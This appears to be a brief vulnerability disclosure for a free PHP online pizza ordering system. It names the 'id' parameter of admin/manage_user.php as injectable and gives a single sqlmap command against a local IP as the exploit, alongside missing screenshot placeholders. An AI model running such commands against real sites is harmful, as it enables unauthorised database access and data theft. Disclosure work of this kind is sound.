vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image-20230223205720244](C:\markdown\images\image-20230223205720244.png)

exp

```
sqlmap.py -u "http://192.168.31.50/php-opos/admin/manage_user.php?id=1"
```

![image-20230223205659995](C:\markdown\images\image-20230223205659995.png)